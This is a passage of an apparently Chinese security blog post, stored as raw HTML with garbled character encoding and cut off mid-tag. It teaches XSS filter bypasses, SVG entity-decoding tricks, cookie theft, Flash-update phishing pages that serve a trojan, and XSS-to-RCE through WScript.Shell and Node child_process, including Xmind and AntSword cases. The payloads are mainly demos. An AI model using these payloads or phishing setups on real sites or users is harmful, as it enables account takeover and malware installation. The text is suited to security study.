href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•"><a href="#SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•" class="headerlink" title="SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•"></a>SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•</h2><p>æˆ‘ä»¬åœ¨ä¸Šæ–‡HTMLç¼–ç é‚£é‡Œæœ€åç•™äº†ä¸€ä¸ªå‘ï¼Œå³HTMLçš„äº”ç±»å…ƒç´ ä¸­ï¼Œåƒ <code>&lt;script&gt;</code>ã€<code>&lt;style&gt;</code> è¿™æ ·çš„åŸå§‹æ–‡æœ¬å…ƒç´ åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œé‡Œé¢å†…å®¹ä¸­çš„HTMLç¼–ç å¹¶ä¸ä¼šè¢«è®¤ä¸ºæ˜¯HTMLå®ä½“å¼•ç”¨ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå‘ä¸‹é¢è¿™æ ·çš„ä»£ç ï¼Œæµè§ˆå™¨ä¸ä¼šå¯¹å…¶ä¸­çš„HTMLå®ä½“å­—ç¬¦è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ä¸ä¼šæ‰§è¡Œå¹¶è§¦å‘XSSäº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>é‚£å¦‚ä½•ç»•è¿‡HTMLåŸå§‹æ–‡æœ¬å…ƒç´ è¿›è€Œæ‰§è¡ŒHTMLå®ä½“è§£ç å‘¢ï¼Œè¿™æ¶‰åŠåˆ°äº† <code>&lt;svg&gt;</code> çš„é­”åŠ›ï¼Œé‚£æ˜¯ä¸€ç§ç‰¹æ®Šçš„è§¦å‘æ•ˆæœï¼Œå•çº¯scriptæ ‡ç­¾å†…åŠ è½½htmlå®ä½“ç¼–ç ï¼Œåªä¼šå½“åšæ–‡æœ¬ï¼Œæ²¡æœ‰ä»»ä½•è§¦å‘ç»“æœï¼Œå¦‚ä¸‹å›¾ï¼š</p><p>[<img src="/../images/20210523094715-cd264a4c-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094715-cd264a4c-bb68-1.png)</p><p>ä½†æ˜¯å½“åœ¨å‰é¢åŠ ä¸Š <code>&lt;svg&gt;</code> åï¼Œå´æˆåŠŸå¼¹çª—äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094716-cd67709e-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094716-cd67709e-bb68-1.png)</p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æ˜¯å› ä¸º <code>&lt;svg&gt;</code> æ ‡ç­¾å±äºHTMLäº”å¤§å…ƒç´ ä¸­çš„å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è§£æåˆ°<code>&lt;svg&gt;</code> æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨å°±å¼€å§‹ä½¿ç”¨ä¸€å¥—æ–°çš„æ ‡å‡†å¼€å§‹è§£æåé¢çš„å†…å®¹ï¼Œç›´åˆ°ç¢°åˆ°é—­åˆæ ‡ç­¾<code>&lt;/svg&gt;</code>ã€‚è€Œåœ¨è¿™ä¸€å¥—æ–°çš„æ ‡å‡†éµå¾ªXMLè§£æè§„åˆ™ï¼Œåœ¨XMLè§£æä¸­ï¼Œå®ä½“ç¼–ç ä¼šè‡ªåŠ¨è§£ç æˆç›¸åº”çš„å­—ç¬¦ï¼Œé‡æ–°æ¥ä¸€éæ ‡ç­¾å¼€å¯çŠ¶æ€ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡ŒXSSäº†ã€‚å¦‚ä¸‹å›¾ï¼Œå¼¹çª—åæˆ‘ä»¬æŸ¥çœ‹é¡µé¢æºç ã€‚å‘ç°åŸæœ¬ä¸èƒ½è¢«HTMLè§£ç çš„å†…å®¹è¢« <code>&lt;svg&gt;</code> æ ‡ç­¾è‡ªåŠ¨è§£ç äº†ï¼š</p><p>[<img src="/../images/20210523094717-cde26b1e-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094717-cde26b1e-bb68-1.png)</p><h1 id="æµ‹è¯•æµç¨‹æ€è·¯"><a href="#æµ‹è¯•æµç¨‹æ€è·¯" class="headerlink" title="æµ‹è¯•æµç¨‹æ€è·¯"></a>æµ‹è¯•æµç¨‹æ€è·¯</h1><p>ä¸‹é¢è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹XSSç»•è¿‡çš„æµ‹è¯•æµç¨‹ã€‚</p><p>ç°å®ä¸­ï¼Œå¤§å¤šæ•°çš„åœºæ‰€æ˜¯ç”¨çš„é»‘åå•æ¥åšXSSè¿‡æ»¤å™¨çš„ï¼Œæœ‰ä¸‰ç§æ–¹å¼ç»•è¿‡é»‘åå•çš„æµ‹è¯•ï¼š</p><ol><li>æš´åŠ›æµ‹è¯•ï¼ˆè¾“å…¥å¤§é‡çš„payloadï¼Œçœ‹è¿”å›ç»“æœï¼‰</li><li>æ ¹æ®æ­£åˆ™æ¨ç®—</li><li>åˆ©ç”¨æµè§ˆå™¨bug</li></ol><h2 id="åˆæ­¥æµ‹è¯•"><a href="#åˆæ­¥æµ‹è¯•" class="headerlink" title="åˆæ­¥æµ‹è¯•"></a>åˆæ­¥æµ‹è¯•</h2><p>ï¼ˆ1ï¼‰å°è¯•æ’å…¥æ¯”è¾ƒæ­£å¸¸çš„HTMLæ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<code>&lt;a&gt;</code>ã€<code>&lt;b&gt;</code>ã€<code>&lt;i&gt;</code>ã€<code>&lt;u&gt;</code> ç­‰ï¼Œæ¥çœ‹ä¸€ä¸‹è¿”å›é¡µé¢çš„æƒ…å†µæ˜¯æ€æ ·çš„ï¼Œæ˜¯å¦è¢«HTMLç¼–ç äº†ï¼Œæˆ–è€…æ ‡ç­¾è¢«è¿‡æ»¤äº†ã€‚</p><p>ï¼ˆ2ï¼‰å°è¯•æ’å…¥ä¸é—­åˆçš„æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š<code>&lt;a</code>ã€<code>&lt;b</code>ã€<code>i&gt;</code>ã€<code>u&gt;</code>ã€<code>&lt;img</code> ç­‰ï¼Œç„¶åçœ‹ä¸€ä¸‹è¿”å›å“åº”ï¼Œæ˜¯å¦å¯¹å¼€æ”¾çš„æ ‡ç­¾ä¹Ÿæœ‰è¿‡æ»¤ã€‚</p><p>ï¼ˆ3ï¼‰ç„¶åæµ‹è¯•å‡ ç§å¸¸è§çš„XSSå‘é‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>çœ‹è¿”å›å“åº”ï¼Œæ˜¯è¿‡æ»¤çš„å…¨éƒ¨ï¼Œè¿˜æ˜¯åªè¿‡æ»¤äº†éƒ¨åˆ†ï¼Œæ˜¯å¦è¿˜ç•™ä¸‹äº† alertã€promptã€confirm ç­‰å­—ç¬¦ï¼Œå†å°è¯•å¤§å°å†™çš„ç»„åˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å¦‚æœè¿‡æ»¤å™¨ä»…ä»…æ˜¯æŠŠ <code>&lt;script&gt;</code> å’Œ <code>&lt;/script&gt;</code> æ ‡ç­¾è¿‡æ»¤æ‰ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨åŒå†™çš„æ–¹å¼æ¥ç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å½“ <code>&lt;script&gt;</code> æ ‡ç­¾è¢«è¿‡æ»¤æ‰åï¼Œå‰©ä¸‹çš„ç»„åˆèµ·æ¥åˆšå¥½å½¢æˆä¸€ä¸ªå®Œæ•´çš„å‘é‡ã€‚</p><p>ï¼ˆ5ï¼‰ç”¨ <code>&lt;a href</code> æ ‡ç­¾æ¥æµ‹è¯•ï¼Œçœ‹è¿”å›å“åº”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹ <code>&lt;a</code> æ ‡ç­¾æ˜¯å¦è¢«è¿‡æ»¤ï¼Œhref æ˜¯å¦è¢«è¿‡æ»¤ï¼Œhrefé‡Œçš„æ•°æ®æ˜¯å¦è¢«è¿‡æ»¤äº†ã€‚å¦‚æœæ²¡æœ‰æ•°æ®è¢«è¿‡æ»¤ï¼Œæ’å…¥javascriptä¼ªåè®®çœ‹çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>çœ‹æ˜¯å¦è¿”å›é”™è¯¯ï¼Œjavascriptçš„æ•´ä¸ªåè®®å†…å®¹æ˜¯å¦éƒ½è¢«è¿‡æ»¤æ‰ï¼Œè¿˜æ˜¯åªè¿‡æ»¤äº†javascriptå­—ç¬¦ã€‚</p><p>ç»§ç»­æµ‹è¯•äº‹ä»¶è§¦å‘æ‰§è¡Œjavascriptï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>çœ‹onmouseoveräº‹ä»¶æ˜¯å¦è¢«è¿‡æ»¤ã€‚</p><p>æµ‹è¯•ä¸€ä¸ªæ— æ•ˆçš„äº‹ä»¶ï¼Œçœ‹çœ‹ä»–çš„è¿‡æ»¤è§„åˆ™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>æ˜¯å®Œæ•´çš„è¿”å›äº†å‘¢ï¼Œè¿˜æ˜¯è·Ÿonmouseoverä¸€æ ·è¢«å¹²æ‰äº†ã€‚å¦‚æœæ˜¯å®Œæ•´çš„è¿”å›çš„è¯ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ï¼Œåšäº†äº‹ä»¶çš„é»‘åå•ï¼Œä½†æ˜¯åœ¨HTML5ä¸­ï¼Œæœ‰è¶…è¿‡150ç§çš„æ–¹å¼æ¥æ‰§è¡Œjavascriptä»£ç çš„äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰ç”¨åˆ«çš„äº‹ä»¶ã€‚æµ‹è¯•ä¸€ä¸ªå¾ˆå°‘è§çš„äº‹ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><blockquote><p>onhashchange äº‹ä»¶åœ¨å½“å‰ URL çš„é”šéƒ¨åˆ†(ä»¥ â€˜#â€™ å·ä¸ºå¼€å§‹) å‘ç”Ÿæ”¹å˜æ—¶è§¦å‘ ã€‚</p></blockquote><h2 id="æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§"><a href="#æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§" class="headerlink" title="æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§"></a>æµ‹è¯•å…¶ä»–æ ‡ç­¾å’Œå±æ€§</h2><p>HTMLçš„æ ‡ç­¾å’Œå±æ€§å¤ªå¤šäº†ï¼Œä¸Šæ–‡ä¸­å·²ç»åˆ—å‡ºäº†å¾ˆå¤šäº†ã€‚</p><h1 id="æ”»å‡»é¢æ‹“å±•"><a href="#æ”»å‡»é¢æ‹“å±•" class="headerlink" title="æ”»å‡»é¢æ‹“å±•"></a>æ”»å‡»é¢æ‹“å±•</h1><h2 id="é’“é±¼"><a href="#é’“é±¼" class="headerlink" title="é’“é±¼"></a>é’“é±¼</h2><h3 id="é€šè¿‡-XSS-ç›—å–-Cookie"><a href="#é€šè¿‡-XSS-ç›—å–-Cookie" class="headerlink" title="é€šè¿‡ XSS ç›—å– Cookie"></a>é€šè¿‡ XSS ç›—å– Cookie</h3><p>Cookieç›—å–æ˜¯xssæ”»å‡»ä¸­æœ€å®ç”¨ä¹Ÿæ˜¯æœ€å¹¿æ³›çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚æˆ‘ä»¬çŸ¥é“Cookieæ˜¯Webç³»ç»Ÿè¯†åˆ«ç”¨æˆ·çš„èº«ä»½å’Œä¿å­˜ä¼šè¯çŠ¶æ€çš„ä¸»è¦æœºåˆ¶ï¼Œä¸”æ˜¯ç”±æœåŠ¡å™¨æä¾›çš„ã€å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„ä¸€ç§æ•°æ®ã€‚åŒæ—¶ï¼Œå¯¹äºcookieçš„æ“ä½œååˆ†çš„æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Documentå¯¹è±¡è®¿é—®Cookieã€‚æœ€ç®€å•çš„æ¯”å¦‚ï¼š<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ï¼Œæ‰§è¡Œåä¼šå¼¹å‡ºå½“å‰é¡µé¢çš„cookieä¿¡æ¯ã€‚åœ¨ç›®æ ‡æ²¡æœ‰â€œåŒæºç­–ç•¥â€çš„ä¿æŠ¤ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨XSSç›—å–ç›®æ ‡ç½‘ç«™ç®¡ç†å‘˜çš„Cookieã€‚</p><p>åœ¨ä¸€èˆ¬çš„é€šç”¨CMSä¸‹å‘¢ï¼Œä¸ºäº†é€šç”¨æ¨¡æ¿çš„å…¼å®¹æ€§ï¼Œè®¸å¤šCMSæœ¬èº«ä¸ä¼šä½¿ç”¨â€œåŒæºç­–ç•¥â€ç­‰å…¶ä»–æ‰‹æ®µæ¥é˜²æŠ¤XSSæ¼æ´ï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªå»ºçš„è¿‡æ»¤å‡½æ•°æ¥å¤„ç†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€æ—¦å‡ºç°XSSæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è·å–ç›®æ ‡çš„Cookieç„¶åä½¿ç”¨ç‰¹å®šçš„æ–¹æ³•æ¥ä¼ è¾“cookieã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘ä¸Šç°æˆçš„æˆ–è‡ªå·±æ­å»ºçš„XSSå¹³å°æ¥å®Œæˆåˆ©ç”¨è¿‡ç¨‹ã€‚</p><h3 id="Flash-å¼¹çª—é’“é±¼"><a href="#Flash-å¼¹çª—é’“é±¼" class="headerlink" title="Flash å¼¹çª—é’“é±¼"></a>Flash å¼¹çª—é’“é±¼</h3><ul><li>é¡¹ç›®ä¸€åœ°å€ï¼š<a href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></li></ul><p>è¯¥é¡¹ç›®æ˜¯æ¨¡ä»¿çš„ Flash Player ä¸­æ–‡å®˜ç½‘çš„é¡µé¢ï¼š</p><p>[<img src="/../images/20210523094717-ce2b906e-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094717-ce2b906e-bb68-1.png)</p><p>éœ€è¦åœ¨index.htmlä¸­çš„åŠ å…¥æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬çš„é“¾æ¥åœ°å€ï¼š</p><p>[<img src="/../images/20210523094718-ce9bd752-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094718-ce9bd752-bb68-1.png)</p><ul><li>é¡¹ç›®äºŒåœ°å€ï¼š<a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li></ul><p>è¯¥é¡¹ç›®æ˜¯ä¸€ä¸ªé€¼çœŸçš„Flashæ›´æ–°æé†’çš„å¼¹çª—ï¼Œå¼ºè¿«ç—‡éƒ½ä¼šå¿ä¸ä½å»ç‚¹å‡»ä¸‹è½½çš„ï¼š</p><p>[<img src="/../images/20210523094718-ced9a208-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094718-ced9a208-bb68-1.png)</p><p>æ‰¾åˆ°flash.jsï¼Œæœç´¢é“¾æ¥â€œ<a href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/â€ï¼Œå°†å…¶æ”¹ä¸ºæˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬çš„é“¾æ¥åœ°å€ï¼Œç„¶åä¿å­˜å³å¯ï¼š</a></p><p>[<img src="/../images/20210523094718-cefeb124-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094718-cefeb124-bb68-1.png)</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>ä¸ºäº†å¤§å¤§æå‡ XSS çš„å±å®³ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ JavaScript æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h3 id="ä½¿ç”¨-WScript-Shell-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#ä½¿ç”¨-WScript-Shell-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ä½¿ç”¨ WScript.Shell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>ä½¿ç”¨ WScript.Shell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul><li><p>Internet Explorer </p></li><li><p>åœ¨IEä¸Šæ‰“å¼€è®¾ç½®ä¸­çš„Intertneté€‰é¡¹-â€œå®‰å…¨â€-â€œè‡ªå®šä¹‰çº§åˆ«â€-â€œå¯¹æ²¡æœ‰æ ‡è®°ä¸ºå®‰å…¨çš„activexæ§ä»¶è¿›è¡Œåˆå§‹åŒ–å’Œè„šæœ¬è¿è¡Œ-è®¾ç½®æˆå¯ç”¨ï¼Œå¦‚ä¸‹</p><p><img src="/../images/20190121110917-f04620ae-1d29-1-1686840019398.jpeg" alt="20190121110917-f04620ae-1d29-1"></p></li></ul><p>WScript.Shellï¼ˆWindows Script Host Runtime Libraryï¼‰æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜¯C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocxï¼ŒWscript.shellæ˜¯æœåŠ¡å™¨ç³»ç»Ÿä¼šç”¨åˆ°çš„ä¸€ç§ç»„ä»¶ã€‚4è¿™ä¸ªå¯¹è±¡å¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå¤–å£³å¸¸ç”¨çš„æ“ä½œï¼Œæ¯”å¦‚è¿è¡Œç¨‹åºã€è¯»å†™æ³¨å†Œè¡¨ã€ç¯å¢ƒå˜é‡ç­‰ã€‚ç®€å•ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">shell.<span class="title function_">run</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230524224855708-1686840019398.png" alt="image-20230524224855708"></p><p>æœ‰æ—¶å€™ä¸ºäº† Bypass ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>String.fromCharCode</code> ä» Ascii æ¥è½¬åŒ–æ¶æ„ä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-child-process-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#ä½¿ç”¨-child-process-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ä½¿ç”¨ child_process æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>ä½¿ç”¨ child_process æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><p>å¦‚æœç›®æ ‡ç¯å¢ƒå¯ç”¨äº† <strong>NodeJS</strong> çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨ NodeJS çš„å­è¿›ç¨‹ï¼ˆchild_processï¼‰è°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;æ›´å¤šç¨€å¥‡å¤æ€ªçš„Payload&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œé‚£ä¹ˆ XSS åœ¨é’“é±¼æ”»å‡»ä¸­çš„ä½œç”¨ä¾¿å¤§å¤§æé«˜äº†ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨ XSS åå¼¹ Shell å¹¶ä¸Šçº¿ Metasploit æˆ– CS ã€‚</p><h3 id="Xmind-2020-XSS-to-RCE"><a href="#Xmind-2020-XSS-to-RCE" class="headerlink" title="Xmind 2020 XSS  to RCE"></a>Xmind 2020 XSS  to RCE</h3><p>æ¼æ´åˆ©ç”¨å¾ˆç®€å•ï¼Œåœ¨ â€œæ€ç»´å¯¼å›¾â€ ä¸­è¾“å‡º Payloadï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094723-d1fa41ae-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094723-d1fa41ae-bb68-1.png)</p><p>åˆ‡æ¢åˆ° â€œå¤§çº²â€ ä¸­ï¼ŒæŒ‰ä¸‹ä¸€ä¸ªåŠŸèƒ½é”®å³å¯è§¦å‘æ”»å‡»ï¼š</p><p>[<img src="/../images/20210523094724-d23097e0-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094724-d23097e0-bb68-1.png)</p><p>ç”±äº Xmind å¯ç”¨äº† NodeJS åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ child_process è°ƒç”¨å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>[<img src="/../images/20210523094724-d269b494-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094724-d269b494-bb68-1.png)</p><p>[<img src="/../images/20210523094725-d2c17756-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094725-d2c17756-bb68-1.png)</p><h3 id="èšå‰‘çš„XSS-to-RCE"><a href="#èšå‰‘çš„XSS-to-RCE" class="headerlink" title="èšå‰‘çš„XSS to RCE"></a>èšå‰‘çš„XSS to RCE</h3><p><a href="https://github.com/AntSwordProject/antSword/issues/147">https://github.com/AntSwordProject/antSword/issues/147</a></p><p><a href="https://xz.aliyun.com/t/8167#toc-0">æµ…è°ˆèšå‰‘RCE - å…ˆçŸ¥ç¤¾åŒº</a></p><h1 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" 